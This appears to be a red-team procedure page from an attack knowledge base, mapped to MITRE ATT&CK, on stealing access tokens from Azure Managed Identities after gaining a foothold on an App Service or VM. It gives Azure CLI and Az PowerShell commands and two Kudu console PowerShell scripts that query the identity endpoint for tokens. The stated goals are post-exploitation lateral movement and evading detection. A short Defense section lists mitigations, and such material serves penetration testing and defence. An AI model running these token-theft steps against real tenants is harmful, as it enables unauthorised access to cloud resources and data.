---
type: procedure
verified: true
submitted: true
created_at: '2023-04-06T03:56:15Z'
updated_at: '2023-05-24T07:56:40Z'
tactics:
  - '[[tactics/Defense-Evasion|TA0005]]'
  - '[[tactics/Discovery|TA0007]]'
  - '[[tactics/Lateral-Movement|TA0008]]'
  - '[[tactics/Credential-Access|TA0006]]'
techniques:
  - '[[techniques/Steal-Application-Access-Token|T1528]]'
  - '[[techniques/Valid-Accounts-Cloud-Accounts|T1078.004]]'
sub_techniques: []
platforms:
  - Cloud
tags:
  - '[[tags/App-Service]]'
  - '[[tags/Cloud-Azure]]'
  - '[[tags/Get-Tokens]]'
  - '[[tags/Kudu]]'
  - '[[tags/Managed-Identity]]'
  - '[[tags/powershell]]'
  - '[[tags/Token-from-Managed-Identity]]'
commands:
  - '[[commands/az-account-get-access-token]]'
  - '[[commands/get-az-access-token]]'
tools: []
validated: true
---

# Retrieve-Access-Tokens-from-Azure-Managed-Identity

## Summary

This procedure demonstrates how to retrieve access tokens from Azure Managed Identities without providing user credentials. It leverages system-assigned or user-assigned identities on Azure resources like App Services or VMs to obtain tokens for Azure CLI, Az PowerShell module, or via the Kudu debug console. This technique is useful for authenticating to Azure services in post-exploitation scenarios, enabling lateral movement or resource access while evading credential-based detection.

## Description

Azure Managed Identities provide a secure mechanism for Azure resources to authenticate to other Azure services without storing credentials. This procedure exploits access to a resource with an assigned identity to extract access tokens, which can then be used for API calls to services like storage, graph, or management APIs. The technique applies to both system-assigned (tied to the resource) and user-assigned (reusable across resources) identities. Execution occurs from within the resource context, such as an App Service console or VM shell. Tokens have limited lifetimes (e.g., 1 hour for access tokens, 14 days for primary refresh tokens), requiring periodic renewal. This maps to scenarios where an attacker has initial foothold on an Azure resource and seeks to expand access using the identity's permissions.

## Requirements

1. Access to an Azure resource (e.g., App Service, VM, Function App) with a system-assigned or user-assigned Managed Identity enabled.
2. Appropriate permissions on the resource to execute commands or access the Kudu debug console (e.g., via deployment credentials or Contributor role).
3. Installed Azure CLI (for az commands) or Az PowerShell module (for Get-AzAccessToken) if executing outside the resource context; otherwise, use built-in environments like Kudu.
4. Knowledge of the target resource URI (e.g., https://management.azure.com for ARM, https://graph.microsoft.com for AAD Graph).

## Defense

- Implement least privilege by assigning minimal roles to Managed Identities and regularly review permissions via Azure AD.
- Use Azure AD Conditional Access policies to restrict access to resources and enable just-in-time (JIT) access for administrative consoles like Kudu.
- Enable Multi-Factor Authentication (MFA) and monitor for anomalous token requests using Azure Monitor, Microsoft Defender for Cloud, or Sentinel logs for identity endpoint accesses.
- Disable or restrict Kudu access via App Service settings and audit PowerShell execution in debug consoles.
- Rotate identities and monitor for unusual API calls from managed identities.

## Objectives

1. Obtain access tokens for Azure services using Managed Identity without exposing user credentials.
2. Authenticate to Azure resources leveraging the identity's granted permissions for actions like data access or lateral movement.
3. Demonstrate evasion of credential-based authentication by utilizing built-in identity features.

## Instructions

### Step 1: Retrieve Token Using Azure CLI

**Context**: If Azure CLI is available on the compromised resource (e.g., via custom container or installed extension), use it to fetch tokens for the default management API or a specific resource type like AAD Graph. This step assumes the CLI is authenticated via the managed identity environment.

**Command** ([[commands/az-account-get-access-token]]):

```bash
az account get-access-token --resource-type $_RESOURCE_TYPE
```

> This command outputs a JSON response with the access token. Replace $_RESOURCE_TYPE with the target (e.g., "aad-graph" for Microsoft Graph). Without the flag, it defaults to the Azure Resource Manager (ARM) endpoint. Verify the token by decoding it at jwt.ms to confirm issuer (aad) and audience.

### Step 2: Retrieve Token Using Az PowerShell Module

**Context**: For environments with the Az PowerShell module loaded (common in Azure Cloud Shell or App Services), use this cmdlet to request a token for a specific resource URL. This is an alternative to CLI when PowerShell is preferred or available.

**Command** ([[commands/get-az-access-token]]):

```powershell
(Get-AzAccessToken -ResourceUrl $_RESOURCE_URL).Token
```

> The output is the raw access token string. Set $_RESOURCE_URL to the target endpoint (e.g., "https://graph.microsoft.com" for Graph API). Success is indicated by a valid JWT token without errors like "authentication failed." Note: Primary Refresh Token (PRT) lifetime is 14 days; refresh before expiry to maintain access.

### Step 3: (Optional) Retrieve Token via Kudu Debug Console - System-Assigned Identity

**Context**: If the resource is an App Service with Kudu access (e.g., via /debug console), execute this PowerShell script in the Kudu console to request a token using environment variables exposed by the managed identity. This bypasses CLI/module dependencies and targets system-assigned identities.

**Code** ([[codes/kudu-powershell-retrieve-system-assigned-identity-token]]):

```powershell
# or KUDU Debug Console Powershell - System Assigned Managed Identity
$resourceURI = "https://storage.azure.com"
$tokenAuthURI = $env:IDENTITY_ENDPOINT + "?resource=$resourceURI&api-version=2019-08-01"
$tokenResponse = Invoke-RestMethod -Method Get -Headers @{"X-IDENTITY-HEADER"="$env:IDENTITY_HEADER"} -Uri $tokenAuthURI
$accessToken = $tokenResponse.access_token
$accessToken
```

> Run this in the Kudu PowerShell environment. It queries the identity endpoint using env vars ($env:IDENTITY_ENDPOINT and $env:IDENTITY_HEADER). Expected output: The access token string. If variables are unset, confirm Managed Identity is enabled in the App Service settings.

### Step 4: (Optional) Retrieve Token via Kudu Debug Console - User-Assigned Identity

**Context**: For user-assigned identities, include the client_id or principal_id in the request. This allows targeting specific identities assigned to the resource, useful when multiple identities are present.

**Code** ([[codes/kudu-powershell-retrieve-user-assigned-identity-token]]):

```powershell
# or KUDU Debug Console Powershell - User Assigned Managed Identity
# Include a client_id or principal_id
$resourceURI = "https://storage.azure.com/"
$client_id = "z5869087-1332-5937-zb1z-xxxxxxxxxx"
$tokenAuthURI = $env:IDENTITY_ENDPOINT + "?resource=$resourceURI&client_id=$client_id&api-version=2019-08-01"
$tokenResponse = Invoke-RestMethod -Method Get -Headers @{"X-IDENTITY-HEADER"="$env:IDENTITY_HEADER"} -Uri $tokenAuthURI
$accessToken = $tokenResponse.access_token
$accessToken
```

> Execute in Kudu PowerShell. Update $client_id with the actual user-assigned identity's client ID from Azure portal. Output: Access token. Decision point: If token fails, verify the identity is assigned and client_id is correct; fallback to system-assigned if applicable.
